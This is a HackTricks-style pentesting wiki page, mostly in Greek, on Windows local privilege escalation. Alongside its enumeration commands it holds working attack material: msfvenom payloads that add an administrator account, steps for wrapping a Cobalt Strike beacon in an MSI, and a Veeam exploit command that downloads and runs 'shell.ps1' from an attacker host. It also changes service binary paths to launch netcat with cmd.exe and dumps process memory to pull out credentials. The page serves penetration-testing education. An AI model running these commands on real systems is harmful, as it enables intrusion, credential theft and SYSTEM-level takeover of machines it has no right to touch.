# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Καλύτερο εργαλείο για να ψάξετε για Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Αρχική Θεωρία Windows

### Access Tokens

**Αν δεν ξέρετε τι είναι τα Windows Access Tokens, διαβάστε την ακόλουθη σελίδα πριν συνεχίσετε:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Ελέγξτε την ακόλουθη σελίδα για περισσότερες πληροφορίες σχετικά με τα ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Αν δεν ξέρετε τι είναι τα integrity levels στα Windows, θα πρέπει να διαβάσετε την ακόλουθη σελίδα πριν συνεχίσετε:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Υπάρχουν διάφορα πράγματα στα Windows που θα μπορούσαν να **σας εμποδίσουν να κάνετε enumeration του συστήματος**, να εκτελέσετε executables ή ακόμα και να **ανιχνεύσουν τις ενέργειές σας**. Θα πρέπει να **διαβάσετε** την ακόλουθη **σελίδα** και να **enumerate** όλους αυτούς τους **defenses** **mechanisms** πριν ξεκινήσετε το privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

Τα UIAccess processes που ξεκινούν μέσω του `RAiLaunchAdminProcess` μπορούν να καταχραστούν ώστε να φτάσουν σε High IL χωρίς prompts όταν παρακάμπτονται οι AppInfo secure-path checks. Δείτε εδώ το dedicated UIAccess/Admin Protection bypass workflow:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Η Secure Desktop accessibility registry propagation μπορεί να καταχραστεί για ένα arbitrary SYSTEM registry write (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## System Info

### Version info enumeration

Ελέγξτε αν η Windows version έχει κάποια γνωστή vulnerability (ελέγξτε επίσης τα patches που έχουν εφαρμοστεί).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Αυτό το [site](https://msrc.microsoft.com/update-guide/vulnerability) είναι χρήσιμο για αναζήτηση λεπτομερών πληροφοριών σχετικά με τις ευπάθειες ασφαλείας της Microsoft. Αυτή η βάση δεδομένων έχει περισσότερες από 4,700 ευπάθειες ασφαλείας, δείχνοντας το **τεράστιο attack surface** που παρουσιάζει ένα Windows environment.

**Στο system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Το Winpeas έχει ενσωματωμένο watson)_

**Τοπικά με system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Υπάρχουν αποθηκευμένα οποιαδήποτε credential/Juicy info στις env variables;
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Ιστορικό PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Αρχεία PowerShell Transcript

Μπορείτε να μάθετε πώς να το ενεργοποιήσετε στο [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Λεπτομέρειες των εκτελέσεων του PowerShell pipeline καταγράφονται, συμπεριλαμβανομένων των εκτελεσμένων commands, των command invocations και τμημάτων των scripts. Ωστόσο, οι πλήρεις λεπτομέρειες εκτέλεσης και τα output results μπορεί να μην καταγράφονται.

Για να το ενεργοποιήσεις, ακολούθησε τις οδηγίες στην ενότητα "Transcript files" της documentation, επιλέγοντας **"Module Logging"** αντί για **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Για να δείτε τα τελευταία 15 events από τα logs του PowersShell μπορείτε να εκτελέσετε:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Καταγράφεται πλήρως η δραστηριότητα και το πλήρες περιεχόμενο της εκτέλεσης του script, διασφαλίζοντας ότι κάθε block κώδικα τεκμηριώνεται καθώς εκτελείται. Αυτή η διαδικασία διατηρεί ένα ολοκληρωμένο audit trail κάθε δραστηριότητας, χρήσιμο για forensics και για την ανάλυση κακόβουλης συμπεριφοράς. Με την τεκμηρίωση όλης της δραστηριότητας τη στιγμή της εκτέλεσης, παρέχονται λεπτομερείς πληροφορίες για τη διαδικασία.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Τα συμβάντα καταγραφής για το Script Block μπορούν να εντοπιστούν μέσα στο Windows Event Viewer στη διαδρομή: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Για να δείτε τα τελευταία 20 συμβάντα μπορείτε να χρησιμοποιήσετε:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ρυθμίσεις Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Drives
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Μπορείς να παραβιάσεις το σύστημα αν οι ενημερώσεις δεν ζητούνται μέσω http**S** αλλά http.

Ξεκινάς ελέγχοντας αν το δίκτυο χρησιμοποιεί μη-SSL WSUS update εκτελώντας τα εξής στο cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ή το παρακάτω σε PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Αν λάβεις μια απάντηση όπως μία από αυτές:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Και αν `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ή `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` είναι ίσο με `1`.

Τότε, **είναι exploitable.** Αν το τελευταίο registry είναι ίσο με 0, τότε η WSUS εγγραφή θα αγνοηθεί.

Για να exploit αυτήν την vulnerabilities μπορείς να χρησιμοποιήσεις tools όπως: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Αυτά είναι MiTM weaponized exploits scripts για να inject 'fake' updates σε non-SSL WSUS traffic.

Διάβασε την έρευνα εδώ:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Διάβασε την πλήρη αναφορά εδώ**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Βασικά, αυτό είναι το flaw που exploitεί αυτό το bug:

> Αν έχουμε τη δυνατότητα να τροποποιήσουμε τον τοπικό user proxy μας, και τα Windows Updates χρησιμοποιούν τον proxy που έχει ρυθμιστεί στις ρυθμίσεις του Internet Explorer, τότε έχουμε επίσης τη δυνατότητα να τρέξουμε [PyWSUS](https://github.com/GoSecure/pywsus) τοπικά ώστε να intercept τη δική μας κίνηση και να τρέξουμε code ως elevated user στο asset μας.
>
> Επιπλέον, αφού η WSUS service χρησιμοποιεί τις ρυθμίσεις του τρέχοντος user, θα χρησιμοποιήσει επίσης το certificate store του. Αν δημιουργήσουμε ένα self-signed certificate για το WSUS hostname και προσθέσουμε αυτό το certificate στο certificate store του τρέχοντος user, θα μπορέσουμε να intercept τόσο HTTP όσο και HTTPS WSUS traffic. Το WSUS δεν χρησιμοποιεί μηχανισμούς τύπου HSTS για να υλοποιήσει validation τύπου trust-on-first-use στο certificate. Αν το certificate που παρουσιάζεται είναι trusted από τον user και έχει το σωστό hostname, θα γίνει accepted από την service.

Μπορείς να exploit αυτήν την vulnerability χρησιμοποιώντας το tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (μόλις απελευθερωθεί).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Πολλά enterprise agents εκθέτουν ένα localhost IPC surface και ένα privileged update channel. Αν η enrollment μπορεί να εξαναγκαστεί προς έναν attacker server και ο updater εμπιστεύεται ένα rogue root CA ή αδύναμους signer checks, ένας local user μπορεί να παραδώσει ένα malicious MSI που η SYSTEM service εγκαθιστά. Δες μια generalized technique (βασισμένη στο Netskope stAgentSvc chain – CVE-2025-0309) εδώ:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Το Veeam B&R < `11.0.1.1261` εκθέτει μια localhost service στο **TCP/9401** που επεξεργάζεται messages ελεγχόμενα από attacker, επιτρέποντας arbitrary commands ως **NT AUTHORITY\SYSTEM**.

- **Recon**: επιβεβαίωσε τον listener και την έκδοση, π.χ. `netstat -ano | findstr 9401` και `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: τοποθέτησε ένα PoC όπως το `VeeamHax.exe` με τα απαιτούμενα Veeam DLLs στον ίδιο κατάλογο, και μετά ενεργοποίησε ένα SYSTEM payload μέσω του τοπικού socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Η υπηρεσία εκτελεί την εντολή ως SYSTEM.
## KrbRelayUp

Υπάρχει μια ευπάθεια **local privilege escalation** σε περιβάλλοντα Windows **domain** υπό συγκεκριμένες συνθήκες. Αυτές οι συνθήκες περιλαμβάνουν περιβάλλοντα όπου το **LDAP signing is not enforced,** οι χρήστες διαθέτουν self-rights που τους επιτρέπουν να διαμορφώνουν **Resource-Based Constrained Delegation (RBCD),** και τη δυνατότητα των χρηστών να δημιουργούν computers εντός του domain. Είναι σημαντικό να σημειωθεί ότι αυτές οι **requirements** ικανοποιούνται με τις **default settings**.

Βρες το **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Για περισσότερες πληροφορίες σχετικά με τη ροή της επίθεσης δες [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Αν** αυτά τα 2 registers είναι **enabled** (τιμή **0x1**), τότε χρήστες οποιουδήποτε privilege μπορούν να **install** (execute) `*.msi` files ως NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Payloads του Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Use the `Write-UserAddMSI` command from power-up to create inside the current directory a Windows MSI binary to escalate privileges. This script writes out a precompiled MSI installer that prompts for a user/group addition (so you will need GIU access):
```
Write-UserAddMSI
```
Απλώς εκτέλεσε το δημιουργημένο binary για να κλιμακώσεις τα privileges.

### MSI Wrapper

Διάβασε αυτό το tutorial για να μάθεις πώς να δημιουργήσεις ένα MSI wrapper χρησιμοποιώντας αυτό το tool. Σημείωσε ότι μπορείς να κάνεις wrap ένα "**.bat**" file αν απλώς θέλεις να **εκτελέσεις** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** με Cobalt Strike ή Metasploit ένα **new Windows EXE TCP payload** στο `C:\privesc\beacon.exe`
- Άνοιξε το **Visual Studio**, επίλεξε **Create a new project** και γράψε "installer" στο search box. Επίλεξε το **Setup Wizard** project και κάνε κλικ στο **Next**.
- Δώσε στο project ένα όνομα, όπως **AlwaysPrivesc**, χρησιμοποίησε το **`C:\privesc`** ως location, επίλεξε **place solution and project in the same directory**, και κάνε κλικ στο **Create**.
- Συνέχισε να κάνεις κλικ στο **Next** μέχρι να φτάσεις στο βήμα 3 από 4 (choose files to include). Κάνε κλικ στο **Add** και επίλεξε το Beacon payload που μόλις δημιούργησες. Έπειτα κάνε κλικ στο **Finish**.
- Επίλεξε το project **AlwaysPrivesc** στο **Solution Explorer** και στις **Properties**, άλλαξε το **TargetPlatform** από **x86** σε **x64**.
- Υπάρχουν και άλλες properties που μπορείς να αλλάξεις, όπως ο **Author** και ο **Manufacturer**, οι οποίες μπορούν να κάνουν την εγκατεστημένη app να φαίνεται πιο νόμιμη.
- Κάνε δεξί κλικ στο project και επίλεξε **View > Custom Actions**.
- Κάνε δεξί κλικ στο **Install** και επίλεξε **Add Custom Action**.
- Κάνε διπλό κλικ στο **Application Folder**, επίλεξε το αρχείο **beacon.exe** και κάνε κλικ στο **OK**. Αυτό θα διασφαλίσει ότι το beacon payload θα εκτελεστεί μόλις τρέξει ο installer.
- Στις **Custom Action Properties**, άλλαξε το **Run64Bit** σε **True**.
- Τέλος, **build it**.
- Αν εμφανιστεί το warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, βεβαιώσου ότι έχεις ορίσει το platform σε x64.

### MSI Installation

Για να εκτελέσεις την **installation** του κακόβουλου `.msi` file σε **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
To exploit this vulnerability you can use: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

Αυτές οι ρυθμίσεις καθορίζουν τι **καταγράφεται**, οπότε θα πρέπει να δώσετε προσοχή
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Το Windows Event Forwarding είναι χρήσιμο να γνωρίζεις πού αποστέλλονται τα logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** έχει σχεδιαστεί για τη **διαχείριση των κωδικών πρόσβασης του τοπικού Administrator**, διασφαλίζοντας ότι κάθε κωδικός είναι **μοναδικός, τυχαίος και ενημερώνεται τακτικά** σε υπολογιστές που είναι joined to a domain. Αυτοί οι κωδικοί αποθηκεύονται με ασφάλεια μέσα στο Active Directory και μπορούν να προσπελαστούν μόνο από χρήστες στους οποίους έχουν δοθεί επαρκή permissions μέσω ACLs, επιτρέποντάς τους να δουν local admin passwords αν είναι authorized.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Αν είναι ενεργό, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Προστασία LSA

Ξεκινώντας με τα **Windows 8.1**, η Microsoft εισήγαγε ενισχυμένη προστασία για το Local Security Authority (LSA) ώστε να **μπλοκάρει** απόπειρες από μη αξιόπιστες διεργασίες να **διαβάσουν τη μνήμη του** ή να εισάγουν code, ενισχύοντας περαιτέρω την ασφάλεια του συστήματος.\
[**Περισσότερες πληροφορίες για την Προστασία LSA εδώ**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credential Guard

Το **Credential Guard** εισήχθη στα **Windows 10**. Σκοπός του είναι να προστατεύει τα διαπιστευτήρια που είναι αποθηκευμένα σε μια συσκευή από απειλές όπως οι επιθέσεις pass-the-hash.| [**Περισσότερες πληροφορίες για το Credentials Guard εδώ.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

Τα **Domain credentials** authenticated by the **Local Security Authority** (LSA) και χρησιμοποιούνται από components του operating system. Όταν τα logon data ενός user authenticated by ένα registered security package, domain credentials για τον user συνήθως established.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Χρήστες & Ομάδες

### Απαρίθμηση Χρηστών & Ομάδων

Θα πρέπει να ελέγξεις αν κάποια από τις ομάδες στις οποίες ανήκεις έχουν ενδιαφέροντα permissions
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

Αν **ανήκετε σε κάποια privileged group, μπορεί να μπορείτε να κάνετε escalate privileges**. Μάθετε για τα privileged groups και πώς να τα abuse για να κάνετε escalate privileges εδώ:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Μάθετε περισσότερα** για το τι είναι ένα **token** σε αυτή τη σελίδα: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Δείτε την ακόλουθη σελίδα για να **μάθετε για ενδιαφέροντα tokens** και πώς να τα abuse:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### Φάκελοι Home
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Πολιτική Κωδικών Πρόσβασης
```bash
net accounts
```
### Πάρε το περιεχόμενο του clipboard
```bash
powershell -command "Get-Clipboard"
```
## Διεργασίες που Εκτελούνται

### Δικαιώματα Αρχείων και Φακέλων

Πρώτα απ’ όλα, στην καταγραφή των διεργασιών **έλεγξε για κωδικούς πρόσβασης μέσα στη γραμμή εντολών της διεργασίας**.\
Έλεγξε αν μπορείς να **αντικαταστήσεις κάποιο εκτελούμενο binary** ή αν έχεις δικαιώματα εγγραφής στον φάκελο του binary ώστε να εκμεταλλευτείς πιθανές [**επιθέσεις DLL Hijacking**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Πάντα να ελέγχετε για πιθανούς [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Έλεγχος δικαιωμάτων των binaries των διεργασιών**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Έλεγχος δικαιωμάτων των φακέλων των binaries των processes (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Εξόρυξη Password από τη μνήμη

Μπορείς να δημιουργήσεις ένα memory dump ενός running process χρησιμοποιώντας το **procdump** από τα sysinternals. Services όπως το FTP έχουν τα **credentials σε clear text στη μνήμη**, προσπάθησε να κάνεις dump τη μνήμη και να διαβάσεις τα credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Ανασφαλείς GUI apps

**Applications που τρέχουν ως SYSTEM μπορεί να επιτρέπουν σε έναν user να ανοίξει ένα CMD ή να περιηγηθεί σε directories.**

Παράδειγμα: "Windows Help and Support" (Windows + F1), αναζήτηση για "command prompt", click on "Click to open Command Prompt"

## Services

Τα Service Triggers επιτρέπουν στα Windows να ξεκινούν μια service όταν συμβαίνουν ορισμένες συνθήκες (δραστηριότητα named pipe/RPC endpoint, ETW events, IP availability, device arrival, GPO refresh, κ.λπ.). Ακόμα και χωρίς δικαιώματα SERVICE_START μπορείς συχνά να ξεκινήσεις privileged services ενεργοποιώντας τα triggers τους. Δες εδώ τις τεχνικές enumeration και activation:

-
{{#ref}}
service-triggers.md
{{#endref}}

Λίστα με services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Δικαιώματα

Μπορείς να χρησιμοποιήσεις το **sc** για να πάρεις πληροφορίες για μια υπηρεσία
```bash
sc qc <service_name>
```
Συνιστάται να έχετε το binary **accesschk** από το _Sysinternals_ για να ελέγξετε το απαιτούμενο επίπεδο προνομίων για κάθε υπηρεσία.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Συνιστάται να ελέγξετε αν οι "Authenticated Users" μπορούν να τροποποιήσουν οποιαδήποτε υπηρεσία:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Μπορείτε να κατεβάσετε το accesschk.exe για XP από εδώ](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Enable service

Αν αντιμετωπίζετε αυτό το σφάλμα (για παράδειγμα με SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Μπορείτε να το ενεργοποιήσετε χρησιμοποιώντας
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Να ληφθεί υπόψη ότι η υπηρεσία upnphost εξαρτάται από το SSDPSRV για να λειτουργήσει (για XP SP1)**

**Μια άλλη λύση** σε αυτό το πρόβλημα είναι να εκτελέσετε:
```
sc.exe config usosvc start= auto
```
### **Τροποποίηση διαδρομής δυαδικού αρχείου υπηρεσίας**

Στο σενάριο όπου η ομάδα "Authenticated users" διαθέτει **SERVICE_ALL_ACCESS** σε μια υπηρεσία, είναι δυνατή η τροποποίηση του εκτελέσιμου δυαδικού αρχείου της υπηρεσίας. Για να τροποποιήσεις και να εκτελέσεις **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Επανεκκίνηση service
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Τα privileges μπορούν να escalated μέσω διαφόρων permissions:

- **SERVICE_CHANGE_CONFIG**: Επιτρέπει reconfiguration του service binary.
- **WRITE_DAC**: Ενεργοποιεί permission reconfiguration, οδηγώντας στη δυνατότητα αλλαγής service configurations.
- **WRITE_OWNER**: Επιτρέπει απόκτηση ownership και permission reconfiguration.
- **GENERIC_WRITE**: Κληρονομεί τη δυνατότητα αλλαγής service configurations.
- **GENERIC_ALL**: Επίσης κληρονομεί τη δυνατότητα αλλαγής service configurations.

Για το detection και exploitation αυτής της vulnerability, μπορεί να χρησιμοποιηθεί το _exploit/windows/local/service_permissions_.

### Services binaries weak permissions

**Ελέγξτε αν μπορείτε να modify το binary που εκτελείται από ένα service** ή αν έχετε **write permissions στο folder** όπου βρίσκεται το binary ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Μπορείτε να πάρετε κάθε binary που εκτελείται από ένα service χρησιμοποιώντας **wmic** (όχι στο system32) και να ελέγξετε τα permissions σας χρησιμοποιώντας **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Μπορείτε επίσης να χρησιμοποιήσετε **sc** και **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Δικαιώματα τροποποίησης registry υπηρεσιών

Πρέπει να ελέγξεις αν μπορείς να τροποποιήσεις κάποιο service registry.\
Μπορείς να **ελέγξεις** τα **permissions** σου πάνω σε ένα service **registry** κάνοντας:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Πρέπει να ελεγχθεί αν οι **Authenticated Users** ή το **NT AUTHORITY\INTERACTIVE** διαθέτουν δικαιώματα `FullControl`. Αν ναι, το binary που εκτελείται από την υπηρεσία μπορεί να τροποποιηθεί.

Για να αλλάξετε το Path του binary που εκτελείται:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Some Windows Accessibility features create per-user **ATConfig** keys that are later copied by a **SYSTEM** process into an HKLM session key. A registry **symbolic link race** can redirect that privileged write into **any HKLM path**, giving an arbitrary HKLM **value write** primitive.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lists installed accessibility features.
